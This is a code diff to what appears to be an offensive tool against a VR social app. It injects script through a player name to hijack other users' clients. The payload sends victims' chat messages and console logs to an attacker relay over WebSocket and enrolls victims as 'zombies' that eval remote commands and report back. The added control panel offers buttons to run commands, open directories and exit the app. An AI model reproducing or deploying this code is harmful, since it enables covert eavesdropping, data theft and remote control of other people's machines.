@@ -466,7 +466,8 @@ let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getEle
 let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
 let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
 let makeZombie = `var sz=new WebSocket('${relayServer}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};`;
-let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };}`;
+let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
+let persistentLogsEavesdropping = `console.log = function(){var args=arguments; var sl=new WebSocket('${relayServer}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:'console.log',message:args}));sl.close();};};`;
 //endregion
 
 let NAME = textName;
@@ -477,6 +478,7 @@ NAME += hideUsernameFromRoomParticipants;
 NAME += persistentChatEavesdropping;
 NAME += makeZombie;
 NAME += discoverRoom;
+NAME += persistentLogsEavesdropping;
 NAME += '</sc'+'ript>';
 
 joinRoomForm.addEventListener("submit", function (event) {
@@ -1075,9 +1077,12 @@ messageRelayWs.onmessage = function(event){
             }
             break;
         }
+        case 'log': {
+            if (zombiesManager.zombies[message.uuid]) {
+                zombiesManager.zombies[message.uuid].zombieControlUI.renderLogMessage(message.level, message.message);
             }
-            //if(zombiesManager.zombies[])
             break;
+        }
         case 'room-discovered':
             discoveredRoomsManager.addRoom(message.roomId);
             break;
@@ -1161,7 +1166,7 @@ function ZombieControlUI(zombie){
     this.zombie = zombie;
     let controlTemplate = document.createElement('template');
     controlTemplate.innerHTML =
-        '<div class="collapse col-6 my-3" id="zombieControl-'+zombie.uuid+'">\n' +
+        '<div class="collapse col-12 my-3 zombieControl" id="zombieControl-'+zombie.uuid+'">\n' +
         '    <div class="card">\n' +
         '        <div class="card-header">\n' +
         '            <b>' + zombie.name + '</b>\n' +
@@ -1226,10 +1231,12 @@ function ZombieControlUI(zombie){
     this.chatElement = this.controlElement.querySelector('div.zombie-chat div.card-body');
     this.logsElement = this.controlElement.querySelector('div.zombie-logs div.card-body');
 
+    this.replFormInputElement = that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0];
+    this.replFormSubmitElement = that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[1];
     this.zombie.repls.push(new Repl(
         that.zombie, // TODO
         that.controlElement.getElementsByClassName('_repl')[0],
-        that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0],
+        this.replFormInputElement,
         that.controlElement.getElementsByTagName('pre')[0],
     ));
 
@@ -1268,6 +1275,34 @@ function ZombieControlUI(zombie){
         );
     });
 
+    this.disable = function(){
+        function disableElement(element){
+            element.disabled = true;
+            element.classList.add('disabled');
+        }
+
+        disableElement(this.replFormInputElement);
+        disableElement(this.replFormSubmitElement);
+        this.replFormSubmitElement.classList.remove('btn-outline-danger');
+
+        disableElement(this.controlElement.getElementsByClassName('_runCalc')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_runCmd')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_openScreenshotDirectory')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_randomizeAvatar')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_exitApp')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_playSoundEffects')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('button')[0]);
+    };
+    this.enable = function(){
+        this.replFormInputElement.disabled = false;
+        this.replFormInputElement.classList.remove('disabled');
+
+        this.replFormSubmitElement.disabled = false;
+        this.replFormSubmitElement.classList.remove('disabled');
+        this.replFormSubmitElement.classList.add('btn-outline-danger');
+    };
+
     this.render = function(controlParent, collapseAElement){
         controlParent.appendChild(this.controlElement);
         collapseAElement.setAttribute('data-toggle', 'collapse');
@@ -1282,6 +1317,25 @@ function ZombieControlUI(zombie){
         this.chatElement.appendChild(messageElement);
     };
 
+    this.renderLogMessage = function(level, logArgs){
+        let logMessage = '';
+        for (let key in logArgs){
+            if(logArgs.hasOwnProperty(key)) {
+                if (typeof logArgs[key] === 'string' || logArgs[key] instanceof String) {
+                    logMessage += ' ' + logArgs[key];
+                }
+                else{
+                    logMessage += ' ' + JSON.stringify(logArgs[key]);
+                }
+            }
+        }
+
+        let messageElement = document.createElement('p');
+        messageElement.appendChild(
+            document.createTextNode(level + logMessage)
+        );
+        this.logsElement.appendChild(messageElement);
+    };
 }
 
 function ZombiesManager(){
@@ -1299,9 +1353,11 @@ function ZombiesManager(){
                 setTimeout(function(){
                      if(that.zombies[uuid].receivedPong){
                          that.zombieManagerUI.updateZombie(that.zombies[uuid]);
+                         that.zombies[uuid].zombieControlUI.enable();
                      }
                      else{
                          that.zombieManagerUI.markZombieLost(that.zombies[uuid]);
+                         that.zombies[uuid].zombieControlUI.disable();
                      }
                 }, 1000);
             }
